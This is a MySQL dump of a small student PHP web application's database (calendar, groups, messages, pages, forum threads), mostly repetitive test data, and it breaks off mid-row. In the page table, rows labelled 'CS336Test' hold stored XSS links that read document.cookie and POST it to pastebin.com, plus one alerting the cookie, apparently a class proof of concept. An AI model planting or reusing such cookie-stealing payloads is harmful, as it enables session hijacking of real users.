-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: gusphp
-- ------------------------------------------------------
-- Server version	5.1.49-1ubuntu8.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `gusphp`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `gusphp` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `gusphp`;

--
-- Table structure for table `calendar`
--

DROP TABLE IF EXISTS `calendar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar` (
  `user` varchar(32) NOT NULL,
  `date` date NOT NULL,
  `data` varchar(150) NOT NULL,
  `eventID` int(11) NOT NULL AUTO_INCREMENT,
  KEY `eventID` (`eventID`),
  KEY `eventID_2` (`eventID`)
) ENGINE=MyISAM AUTO_INCREMENT=616 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar`
--

LOCK TABLES `calendar` WRITE;
/*!40000 ALTER TABLE `calendar` DISABLE KEYS */;
INSERT INTO `calendar` VALUES ('admin','2011-02-26','another event',3),('admin','2011-02-24','updated',2),('admin','2011-02-21','event',4),('user1','2011-03-15','an event in march',6),('admin','2011-02-23','updated',7),('admin','0000-00-00','different event',8),('long3841','2011-02-19','event',9),('cblair','2011-02-21','asdfasdf',10),('cblair','2011-02-27','asdfasfdasfd',11),('long3841','2011-02-21','something',12),('cblair','2011-03-12','test',13),('','2011-03-12','test2',14),('','2011-03-12','something',28),('','2011-03-31','something',189),('','2011-03-31','something',188),('','2011-03-31','something',187),('','2011-03-31','something',186),('','2011-03-29','something',181),('long3841','2011-03-15','something',109),('','2011-03-29','something',180),('','2011-03-29','something',179),('','2011-03-29','something',178),('','2011-03-30','something',184),('','2011-03-21','something',114),('','2011-03-30','something',185),('','2011-03-27','something',173),('','2011-03-20','something',110),('','2011-03-30','something',182),('','2011-04-01','something',192),('','2011-03-18','something',107),('cblair','2011-04-01','Fool!',190),('','2011-04-01','something',193),('','2011-04-01','something',194),('','2011-04-01','something',195),('','2011-04-02','something',196),('','2011-04-02','something',197),('','2011-04-02','something',198),('','2011-04-02','something',199),('','2011-04-02','something',200),('','2011-04-02','something',201),('','2011-04-02','something',202),('','2011-04-02','something',203),('','2011-04-02','something',204),('','2011-04-02','something',205),('','2011-04-02','something',206),('','2011-04-02','something',207),('test','2011-04-02','something',208),('','2011-04-02','something',209),('test','2011-04-02','something',210),('','2011-04-02','something',211),('test','2011-04-02','something',212),('','2011-04-02','something',213),('test','2011-04-02','something',214),('','2011-04-02','something',215),('test','2011-04-02','something',216),('','2011-04-02','something',217),('test','2011-04-02','something',218),('','2011-04-02','something',219),('test','2011-04-02','something',220),('','2011-04-02','something',221),('test','2011-04-02','something',222),('','2011-04-02','something',223),('test','2011-04-02','something',224),('','2011-04-02','something',225),('test','2011-04-02','something',226),('','2011-04-02','something',227),('test','2011-04-02','something',228),('','2011-04-02','something',229),('test','2011-04-02','something',230),('','2011-04-02','something',231),('test','2011-04-02','something',232),('','2011-04-02','something',233),('test','2011-04-02','something',234),('','2011-04-02','something',235),('test','2011-04-02','something',236),('','2011-04-02','something',237),('test','2011-04-02','something',238),('','2011-04-02','something',239),('test','2011-04-02','something',240),('','2011-04-02','something',241),('test','2011-04-02','something',242),('','2011-04-02','something',243),('test','2011-04-02','something',244),('','2011-04-02','something',245),('test','2011-04-02','something',246),('','2011-04-02','something',247),('test','2011-04-02','something',248),('','2011-04-02','something',249),('test','2011-04-02','something',250),('','2011-04-02','something',251),('test','2011-04-02','something',252),('','2011-04-02','something',253),('test','2011-04-02','something',254),('','2011-04-02','something',255),('test','2011-04-02','something',256),('','2011-04-02','something',257),('test','2011-04-02','something',258),('','2011-04-02','something',259),('test','2011-04-02','something',260),('','2011-04-02','something',261),('test','2011-04-02','something',262),('','2011-04-02','something',263),('test','2011-04-02','something',264),('','2011-04-02','something',265),('test','2011-04-02','something',266),('','2011-04-02','something',267),('test','2011-04-02','something',268),('','2011-04-02','something',269),('test','2011-04-02','something',270),('','2011-04-02','something',271),('test','2011-04-02','something',272),('','2011-04-02','something',273),('test','2011-04-02','something',274),('','2011-04-02','something',275),('test','2011-04-02','something',276),('','2011-04-02','something',277),('test','2011-04-02','something',278),('','2011-04-02','something',279),('test','2011-04-02','something',280),('','2011-04-02','something',281),('test','2011-04-02','something',282),('','2011-04-02','something',283),('test','2011-04-02','something',284),('','2011-04-02','something',285),('test','2011-04-02','something',286),('','2011-04-02','something',287),('test','2011-04-02','something',288),('','2011-04-02','something',289),('test','2011-04-02','something',290),('','2011-04-02','something',291),('test','2011-04-02','something',292),('','2011-04-02','something',293),('test','2011-04-02','something',294),('','2011-04-02','something',295),('test','2011-04-02','something',296),('','2011-04-02','something',297),('test','2011-04-02','something',298),('','2011-04-02','something',299),('test','2011-04-02','something',300),('','2011-04-02','something',301),('test','2011-04-02','something',302),('','2011-04-02','something',303),('test','2011-04-02','something',304),('','2011-04-02','something',305),('test','2011-04-02','something',306),('','2011-04-02','something',307),('test','2011-04-02','something',308),('','2011-04-02','something',309),('test','2011-04-02','something',310),('','2011-04-02','something',311),('test','2011-04-02','something',312),('','2011-04-02','something',313),('test','2011-04-02','something',314),('','2011-04-02','something',315),('test','2011-04-02','something',316),('','2011-04-02','something',317),('test','2011-04-02','something',318),('','2011-04-02','something',319),('test','2011-04-02','something',320),('','2011-04-02','something',321),('test','2011-04-02','something',322),('','2011-04-02','something',323),('test','2011-04-02','something',324),('','2011-04-02','something',325),('test','2011-04-02','something',326),('','2011-04-02','something',327),('test','2011-04-02','something',328),('','2011-04-02','something',329),('test','2011-04-02','something',330),('','2011-04-02','something',331),('test','2011-04-02','something',332),('','2011-04-02','something',333),('test','2011-04-02','something',334),('','2011-04-02','something',335),('test','2011-04-02','something',336),('','2011-04-02','something',337),('test','2011-04-02','something',338),('','2011-04-02','something',339),('test','2011-04-02','something',340),('','2011-04-02','something',341),('test','2011-04-02','something',342),('','2011-04-02','something',343),('test','2011-04-02','something',344),('','2011-04-02','something',345),('test','2011-04-02','something',346),('','2011-04-02','something',347),('test','2011-04-02','something',348),('','2011-04-02','something',349),('test','2011-04-02','something',350),('','2011-04-02','something',351),('test','2011-04-02','something',352),('','2011-04-02','something',353),('test','2011-04-02','something',354),('','2011-04-02','something',355),('test','2011-04-02','something',356),('','2011-04-02','something',357),('test','2011-04-02','something',358),('','2011-04-02','something',359),('test','2011-04-02','something',360),('','2011-04-02','something',361),('test','2011-04-02','something',362),('','2011-04-02','something',363),('test','2011-04-02','something',364),('','2011-04-02','something',365),('test','2011-04-02','something',366),('','2011-04-02','something',367),('test','2011-04-02','something',368),('','2011-04-02','something',369),('test','2011-04-02','something',370),('','2011-04-02','something',371),('test','2011-04-02','something',372),('','2011-04-02','something',373),('test','2011-04-02','something',374),('','2011-04-02','something',375),('test','2011-04-02','something',376),('','2011-04-02','something',377),('test','2011-04-02','something',378),('','2011-04-02','something',379),('test','2011-04-02','something',380),('','2011-04-02','something',381),('test','2011-04-02','something',382),('','2011-04-02','something',383),('test','2011-04-02','something',384),('','2011-04-02','something',385),('test','2011-04-02','something',386),('','2011-04-02','something',387),('test','2011-04-02','something',388),('','2011-04-02','something',389),('test','2011-04-02','something',390),('','2011-04-02','something',391),('test','2011-04-02','something',392),('','2011-04-02','something',393),('test','2011-04-02','something',394),('','2011-04-02','something',395),('test','2011-04-02','something',396),('','2011-04-02','something',397),('test','2011-04-02','something',398),('','2011-04-02','something',399),('test','2011-04-02','something',400),('','2011-04-02','something',401),('test','2011-04-02','something',402),('','2011-04-02','something',403),('test','2011-04-02','something',404),('','2011-04-02','something',405),('test','2011-04-02','something',406),('','2011-04-02','something',407),('test','2011-04-02','something',408),('','2011-04-02','something',409),('test','2011-04-02','something',410),('','2011-04-02','something',411),('test','2011-04-02','something',412),('','2011-04-02','something',413),('test','2011-04-02','something',414),('','2011-04-02','something',415),('test','2011-04-02','something',416),('','2011-04-02','something',417),('test','2011-04-02','something',418),('','2011-04-02','something',419),('test','2011-04-02','something',420),('','2011-04-02','something',421),('test','2011-04-02','something',422),('','2011-04-02','something',423),('test','2011-04-02','something',424),('','2011-04-02','something',425),('test','2011-04-02','something',426),('','2011-04-02','something',427),('test','2011-04-02','something',428),('','2011-04-02','something',429),('test','2011-04-02','something',430),('','2011-04-02','something',431),('test','2011-04-02','something',432),('','2011-04-02','something',433),('test','2011-04-02','something',434),('','2011-04-02','something',435),('test','2011-04-02','something',436),('','2011-04-02','something',437),('test','2011-04-02','something',438),('','2011-04-02','something',439),('test','2011-04-02','something',440),('','2011-04-02','something',441),('test','2011-04-02','something',442),('','2011-04-02','something',443),('test','2011-04-02','something',444),('','2011-04-02','something',445),('test','2011-04-02','something',446),('','2011-04-02','something',447),('test','2011-04-02','something',448),('','2011-04-02','something',449),('test','2011-04-02','something',450),('','2011-04-02','something',451),('test','2011-04-02','something',452),('','2011-04-02','something',453),('test','2011-04-02','something',454),('','2011-04-02','something',455),('test','2011-04-02','something',456),('','2011-04-02','something',457),('test','2011-04-02','something',458),('','2011-04-02','something',459),('test','2011-04-02','something',460),('','2011-04-02','something',461),('test','2011-04-02','something',462),('','2011-04-02','something',463),('test','2011-04-02','something',464),('','2011-04-02','something',465),('test','2011-04-02','something',466),('','2011-04-02','something',467),('test','2011-04-03','something',468),('','2011-04-03','something',557),('test','2011-04-03','something',470),('','2011-04-03','something',556),('test','2011-04-03','something',472),('','2011-04-03','something',473),('test','2011-04-03','something',474),('','2011-04-03','something',475),('test','2011-04-03','something',476),('','2011-04-03','something',477),('test','2011-04-03','something',478),('','2011-04-03','something',479),('test','2011-04-03','something',480),('','2011-04-03','something',481),('test','2011-04-03','something',482),('','2011-04-03','something',483),('test','2011-04-03','something',484),('','2011-04-03','something',485),('test','2011-04-03','something',486),('','2011-04-03','something',487),('test','2011-04-03','something',488),('','2011-04-03','something',489),('test','2011-04-03','something',490),('','2011-04-03','something',491),('test','2011-04-03','something',492),('','2011-04-03','something',493),('test','2011-04-03','something',494),('','2011-04-03','something',495),('test','2011-04-03','something',496),('','2011-04-03','something',497),('test','2011-04-03','something',498),('','2011-04-03','something',499),('test','2011-04-03','something',500),('','2011-04-03','something',501),('test','2011-04-03','something',502),('','2011-04-03','something',503),('test','2011-04-03','something',504),('','2011-04-03','something',505),('test','2011-04-03','something',506),('','2011-04-03','something',507),('test','2011-04-03','something',508),('','2011-04-03','something',509),('test','2011-04-03','something',510),('','2011-04-03','something',511),('test','2011-04-03','something',512),('','2011-04-03','something',513),('test','2011-04-03','something',514),('','2011-04-03','something',515),('test','2011-04-03','something',516),('','2011-04-03','something',517),('test','2011-04-03','something',518),('','2011-04-03','something',519),('test','2011-04-03','something',520),('','2011-04-03','something',521),('test','2011-04-03','something',522),('','2011-04-03','something',523),('test','2011-04-03','something',524),('','2011-04-03','something',525),('test','2011-04-03','something',526),('','2011-04-03','something',527),('test','2011-04-03','something',528),('','2011-04-03','something',529),('test','2011-04-03','something',530),('','2011-04-03','something',531),('test','2011-04-03','something',532),('','2011-04-03','something',533),('test','2011-04-03','something',534),('','2011-04-03','something',535),('test','2011-04-03','something',536),('','2011-04-03','something',537),('test','2011-04-03','something',538),('','2011-04-03','something',539),('test','2011-04-03','something',540),('','2011-04-03','something',541),('test','2011-04-03','something',542),('','2011-04-03','something',543),('test','2011-04-03','something',544),('','2011-04-03','something',545),('test','2011-04-03','something',546),('','2011-04-03','something',547),('test','2011-04-03','something',548),('','2011-04-03','something',549),('test','2011-04-03','something',550),('','2011-04-03','something',551),('test','2011-04-03','something',552),('','2011-04-03','something',553),('test','2011-04-03','something',554),('','2011-04-03','something',555),('','2011-04-03','something',558),('','2011-04-03','something',559),('','2011-04-03','something',560),('','2011-04-03','something',561),('test','2011-04-03','something',562),('','2011-04-03','something',563),('test','2011-04-03','something',564),('','2011-04-03','something',565),('','2011-04-03','something',566),('','2011-04-03','something',567),('','2011-04-03','something',568),('','2011-04-03','something',569),('test','2011-04-03','something',570),('','2011-04-03','something',571),('test','2011-04-03','something',572),('','2011-04-03','something',573),('test','2011-04-03','something',574),('','2011-04-03','something',575),('test','2011-04-03','something',576),('','2011-04-03','something',577),('test','2011-04-03','something',578),('','2011-04-03','something',579),('test','2011-04-04','something',580),('','2011-04-04','something',581),('test','2011-04-04','something',582),('','2011-04-04','something',583),('test','2011-04-04','something',584),('','2011-04-04','something',585),('test','2011-04-04','something',586),('','2011-04-04','something',587),('test','2011-04-04','something',589),('','2011-04-04','something',590),('test','2011-04-04','something',591),('','2011-04-04','something',592),('test','2011-04-05','something',593),('','2011-04-05','something',594),('test','2011-04-05','something',595),('','2011-04-05','something',596),('test','2011-04-06','something',597),('','2011-04-06','something',598),('test','2011-04-06','something',599),('','2011-04-06','something',600),('test','2011-04-06','something',601),('','2011-04-06','something',602),('test','2011-04-06','something',603),('','2011-04-06','something',604),('test','2011-04-07','something',605),('','2011-04-07','something',606),('test','2011-04-07','something',607),('','2011-04-07','something',608),('test','2011-04-08','something',612),('','2011-04-08','something',610),('cblair','2011-03-09','test',611),('','2011-04-08','something',613),('','2011-04-09','something',614),('','2011-04-09','something',615);
/*!40000 ALTER TABLE `calendar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ggroup`
--

DROP TABLE IF EXISTS `ggroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ggroup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=247 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ggroup`
--

LOCK TABLES `ggroup` WRITE;
/*!40000 ALTER TABLE `ggroup` DISABLE KEYS */;
INSERT INTO `ggroup` VALUES (5,'test_group','test_desc'),(10,'main','Gus main group. Users set to admin (7) on this group get system wide admin privileges.');
/*!40000 ALTER TABLE `ggroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
`respond_id` INT NULL ,
`from_id` INT NOT NULL ,
`to_id` INT NOT NULL ,
`subject` VARCHAR( 64 ) NOT NULL ,
`message` VARCHAR( 255 ) NOT NULL ,
`location` ENUM( 'inbox', 'sent', 'archived' ) NOT NULL ,
`created` TIMESTAMP NOT NULL
) ENGINE = MYISAM ;

/*!40101 SET character_set_client = @saved_cs_client */;

INSERT INTO `messages` VALUES (1,0,1,0,'test','test','inbox','2011-02-10 20:13:09');

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `page`
--

DROP TABLE IF EXISTS `page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=110 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `page`
--

LOCK TABLES `page` WRITE;
/*!40000 ALTER TABLE `page` DISABLE KEYS */;
INSERT INTO `page` VALUES (27,'test','Test content'),(16,'home','<p>Gus Home Page.</p>\n<p>Developers, tests and beta users - please see http://nwerp.org/trac/gus . (You will need a gus account on this server for access.)</p>\n<p>This is the latest (stablest) version of the project. <br /> <br /> Last git pull on 04/01/11 .</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>CS336Test<br />&nbsp; <a href=\"javascript:function a(){alert(document.cookie);}a();\">Session Hijack Script</a>&nbsp; <br /> Yeah, don\'t actually click that.</p>'),(18,'auth','Gus Authentication'),(19,'CS336 Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(20,'CS336Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(21,NULL,NULL),(102,'group_main','<p style=\"text-align: left;\">This <span style=\"text-decoration: underline;\">is</span> <strong></strong></p>\n<p style=\"text-align: right;\"><strong>content</strong> <em></em></p>\n<p style=\"text-align: center;\"><em>specific</em></p>\n<p style=\"text-align: left;\"><em></em>to the <span style=\"font-size: large;\">main</span> group.</p>\n<ol>\n<li>-</li>\n<li>-</li>\n<li>-</li>\n</ol>\n<ul>\n<li>1</li>\n<li>2</li>\n<li>3</li>\n</ul>'),(103,'group_test_group','<p>This <em>is</em> <span style=\"text-decoration: underline;\"><strong>content</strong></span> specific</p>\n<p style=\"text-align: right;\">to</p>\n<p style=\"text-align: center;\">the</p>\n<p style=\"text-align: left;\"><span style=\"font-size: x-small; font-family: impact,chicago;\">test_group</span> group.</p>');
/*!40000 ALTER TABLE `page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `replies`
--

DROP TABLE IF EXISTS `replies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `replies` (
  `thread_id` int(4) NOT NULL DEFAULT '0',
  `reply_id` int(4) NOT NULL DEFAULT '0',
  `author` varchar(65) NOT NULL DEFAULT '',
  `a_email` varchar(65) NOT NULL DEFAULT '',
  `body` longtext NOT NULL,
  `datetime` varchar(25) NOT NULL DEFAULT '',
  KEY `a_id` (`reply_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `replies`
--

LOCK TABLES `replies` WRITE;
/*!40000 ALTER TABLE `replies` DISABLE KEYS */;
INSERT INTO `replies` VALUES (5,0,'Chaylo','','Just testing the reply counter','15/Feb/2011 07:59:36'),(5,0,'testing','','testing some more','15/Feb/2011 08:50:23'),(5,0,'testing','','testing','15/Feb/2011 08:53:16'),(6,0,'tesing','','testing','15/Feb/2011 08:53:27'),(5,0,'','','Gadzooks.','17/Feb/2011 07:35:18'),(10,0,'cblair','','This is only a reply','01/Apr/2011 11:14:48'),(10,0,'cblair','','another reply.','01/Apr/2011 01:33:45');
/*!40000 ALTER TABLE `replies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `threads`
--

DROP TABLE IF EXISTS `threads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `threads` (
  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
  `thread_topic` varchar(255) NOT NULL DEFAULT '',
  `thread_body` longtext NOT NULL,
  `thread_author` varchar(65) NOT NULL DEFAULT '',
  `email` varchar(65) NOT NULL DEFAULT '',
  `datetime` varchar(25) NOT NULL DEFAULT '',
  `view` int(4) NOT NULL DEFAULT '0',
  `num_replies` int(4) NOT NULL DEFAULT '0',
  `group_id` int(100) NOT NULL,
  `group_name` varchar(128) NOT NULL,
  PRIMARY KEY (`thread_id`)
) ENGINE=InnoDB AUTO_INCREMENT=156 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `threads`
--

LOCK TABLES `threads` WRITE;
/*!40000 ALTER TABLE `threads` DISABLE KEYS */;
INSERT INTO `threads` VALUES (5,'First Forum Entry','Just a quick test to make sure everything is working','Chaylo','','15/Feb/2011 07:59:21',0,6,1,''),(6,'Gotta check it all again!','Ugh','Chaylo','','15/Feb/2011 08:50:01',0,1,1,''),(7,'testing 1 2 3','Hello?','Chaylo','','25/Mar/2011 10:35:22',0,2,1,'test'),(9,'testing','smurF!','claurino','','28/Mar/2011 03:18:44',0,3,1,'test'),(10,'This is only a test...','test','cblair','','01/Apr/2011 11:14:36',0,2,10,''),(11,'','','test','','02/Apr/2011 09:57:10',0,0,0,''),(12,'','','test','','02/Apr/2011 09:57:15',0,0,0,''),(13,'','','test','','02/Apr/2011 09:59:05',0,0,0,''),(14,'','','test','','02/Apr/2011 09:59:10',0,0,0,''),(15,'','','test','','02/Apr/2011 10:03:41',0,0,0,''),(16,'','','test','','02/Apr/2011 10:03:46',0,0,0,''),(17,'','','test','','02/Apr/2011 10:04:25',0,0,0,''),(18,'','','test','','02/Apr/2011 10:04:27',0,0,0,''),(19,'','','test','','02/Apr/2011 10:04:28',0,0,0,''),(20,'','','test','','02/Apr/2011 10:05:21',0,0,0,''),(21,'','','test','','02/Apr/2011 10:05:26',0,0,0,''),(22,'','','test','','02/Apr/2011 10:07:11',0,0,0,''),(23,'','','test','','02/Apr/2011 10:07:16',0,0,0,''),(24,'','','test','','02/Apr/2011 10:10:01',0,0,0,''),(25,'','','test','','02/Apr/2011 10:10:05',0,0,0,''),(26,'','','test','','02/Apr/2011 10:10:47',0,0,0,''),(27,'','','test','','02/Apr/2011 10:11:32',0,0,0,''),(28,'','','test','','02/Apr/2011 10:11:37',0,0,0,''),(29,'','','test','','02/Apr/2011 10:14:51',0,0,0,''),(30,'','','test','','02/Apr/2011 10:14:56',0,0,0,''),(31,'','','test','','02/Apr/2011 10:15:02',0,0,0,''),(32,'','','test','','02/Apr/2011 10:15:24',0,0,0,''),(33,'','','test','','02/Apr/2011 10:15:35',0,0,0,''),(34,'','','test','','02/Apr/2011 10:15:40',0,0,0,''),(35,'','','test','','02/Apr/2011 10:16:56',0,0,0,''),(36,'','','test','','02/Apr/2011 10:17:02',0,0,0,''),(37,'','','test','','02/Apr/2011 10:17:07',0,0,0,''),(38,'','','test','','02/Apr/2011 10:19:11',0,0,0,''),(39,'','','test','','02/Apr/2011 10:19:16',0,0,0,''),(40,'','','test','','02/Apr/2011 10:33:29',0,0,0,''),(41,'','','test','','02/Apr/2011 10:33:34',0,0,0,''),(42,'','','test','','02/Apr/2011 10:35:17',0,0,0,''),(43,'','','test','','02/Apr/2011 10:35:22',0,0,0,''),(44,'','','test','','02/Apr/2011 10:36:20',0,0,0,''),(45,'','','test','','02/Apr/2011 10:36:25',0,0,0,''),(46,'','','test','','02/Apr/2011 10:37:28',0,0,0,''),(47,'','','test','','02/Apr/2011 10:37:33',0,0,0,''),(48,'','','test','','02/Apr/2011 10:37:52',0,0,0,''),(49,'','','test','','02/Apr/2011 10:37:57',0,0,0,''),(50,'','','test','','02/Apr/2011 10:39:00',0,0,0,''),(51,'','','test','','02/Apr/2011 10:39:05',0,0,0,''),(52,'','','test','','02/Apr/2011 10:39:47',0,0,0,''),(53,'','','test','','02/Apr/2011 10:39:52',0,0,0,''),(54,'','','test','','02/Apr/2011 10:52:19',0,0,0,''),(55,'','','test','','02/Apr/2011 10:52:25',0,0,0,''),(56,'','','test','','02/Apr/2011 10:53:00',0,0,0,''),(57,'','','test','','02/Apr/2011 10:53:06',0,0,0,''),(58,'','','test','','02/Apr/2011 10:53:25',0,0,0,''),(59,'','','test','','02/Apr/2011 10:53:30',0,0,0,''),(60,'','','test','','02/Apr/2011 10:56:24',0,0,0,''),(61,'','','test','','02/Apr/2011 10:56:30',0,0,0,''),(62,'','','test','','02/Apr/2011 12:18:48',0,0,0,''),(63,'','','test','','02/Apr/2011 12:18:54',0,0,0,''),(64,'','','test','','02/Apr/2011 12:30:02',0,0,0,''),(65,'','','test','','02/Apr/2011 12:30:07',0,0,0,''),(66,'','','test','','02/Apr/2011 12:35:38',0,0,0,''),(67,'','','test','','02/Apr/2011 12:35:43',0,0,0,''),(68,'','','test','','02/Apr/2011 12:42:33',0,0,0,''),(69,'','','test','','02/Apr/2011 12:42:38',0,0,0,''),(70,'','','test','','02/Apr/2011 12:48:35',0,0,0,''),(71,'','','test','','02/Apr/2011 12:48:41',0,0,0,''),(72,'','','test','','02/Apr/2011 01:01:24',0,0,0,''),(73,'','','test','','02/Apr/2011 01:01:29',0,0,0,''),(74,'','','test','','02/Apr/2011 01:04:09',0,0,0,''),(75,'','','test','','02/Apr/2011 01:04:15',0,0,0,''),(76,'','','test','','02/Apr/2011 01:47:33',0,0,0,''),(77,'','','test','','02/Apr/2011 01:47:38',0,0,0,''),(78,'','','test','','02/Apr/2011 01:50:17',0,0,0,''),(79,'','','test','','02/Apr/2011 01:50:23',0,0,0,''),(80,'','','test','','02/Apr/2011 01:57:38',0,0,0,''),(81,'','','test','','02/Apr/2011 01:57:44',0,0,0,''),(82,'','','test','','02/Apr/2011 01:58:44',0,0,0,''),(83,'','','test','','02/Apr/2011 01:58:50',0,0,0,''),(84,'','','test','','02/Apr/2011 02:19:22',0,0,0,''),(85,'','','test','','02/Apr/2011 02:19:28',0,0,0,''),(86,'','','test','','02/Apr/2011 02:22:27',0,0,0,''),(87,'','','test','','02/Apr/2011 02:22:33',0,0,0,''),(88,'','','test','','02/Apr/2011 11:00:20',0,0,0,''),(89,'','','test','','02/Apr/2011 11:00:26',0,0,0,''),(90,'','','test','','03/Apr/2011 09:31:16',0,0,0,''),(91,'','','test','','03/Apr/2011 09:31:36',0,0,0,''),(92,'','','test','','03/Apr/2011 09:39:38',0,0,0,''),(93,'','','test','','03/Apr/2011 09:39:45',0,0,0,''),(94,'','','test','','03/Apr/2011 09:46:13',0,0,0,''),(95,'','','test','','03/Apr/2011 09:46:21',0,0,0,''),(96,'','','test','','03/Apr/2011 09:55:30',0,0,0,''),(97,'','','test','','03/Apr/2011 09:55:35',0,0,0,''),(98,'','','test','','03/Apr/2011 09:58:16',0,0,0,''),(99,'','','test','','03/Apr/2011 09:58:22',0,0,0,''),(100,'','','test','','03/Apr/2011 10:13:56',0,0,0,''),(101,'','','test','','03/Apr/2011 10:14:02',0,0,0,''),(102,'','','test','','03/Apr/2011 10:14:40',0,0,0,''),(103,'','','test','','03/Apr/2011 10:14:45',0,0,0,''),(104,'','','test','','03/Apr/2011 10:15:17',0,0,0,''),(105,'','','test','','03/Apr/2011 10:15:22',0,0,0,''),(106,'','','test','','03/Apr/2011 10:15:41',0,0,0,''),(107,'','','test','','03/Apr/2011 10:15:47',0,0,0,''),(108,'','','test','','03/Apr/2011 10:22:22',0,0,0,''),(109,'','','test','','03/Apr/2011 10:22:28',0,0,0,''),(110,'','','test','','03/Apr/2011 10:28:10',0,0,0,''),(111,'','','test','','03/Apr/2011 10:28:15',0,0,0,''),(112,'','','test','','03/Apr/2011 10:35:44',0,0,0,''),(113,'','','test','','03/Apr/2011 10:35:50',0,0,0,''),(114,'','','test','','03/Apr/2011 10:36:53',0,0,0,''),(115,'','','test','','03/Apr/2011 10:36:58',0,0,0,''),(116,'','','test','','03/Apr/2011 10:38:06',0,0,0,''),(117,'','','test','','03/Apr/2011 10:38:12',0,0,0,''),(118,'','','test','','03/Apr/2011 10:44:10',0,0,0,''),(119,'','','test','','03/Apr/2011 10:44:16',0,0,0,''),(120,'','','test','','03/Apr/2011 10:45:47',0,0,0,''),(121,'','','test','','03/Apr/2011 10:45:53',0,0,0,''),(122,'','','test','','03/Apr/2011 10:46:53',0,0,0,''),(123,'','','test','','03/Apr/2011 10:46:59',0,0,0,''),(124,'','','test','','03/Apr/2011 10:48:18',0,0,0,''),(125,'','','test','','03/Apr/2011 10:48:24',0,0,0,''),(126,'','','test','','03/Apr/2011 11:14:59',0,0,0,''),(127,'','','test','','03/Apr/2011 11:15:06',0,0,0,''),(128,'','','test','','03/Apr/2011 11:29:52',0,0,0,''),(129,'','','test','','03/Apr/2011 11:29:59',0,0,0,''),(130,'','','test','','03/Apr/2011 11:32:18',0,0,0,''),(131,'','','test','','03/Apr/2011 11:32:24',0,0,0,''),(132,'','','test','','03/Apr/2011 11:43:40',0,0,0,''),(133,'','','test','','03/Apr/2011 11:43:46',0,0,0,''),(134,'','','test','','03/Apr/2011 08:38:36',0,0,0,''),(135,'','','test','','03/Apr/2011 08:39:44',0,0,0,''),(136,'','','test','','03/Apr/2011 08:42:19',0,0,0,''),(137,'','','test','','03/Apr/2011 08:43:51',0,0,0,''),(138,'','','test','','03/Apr/2011 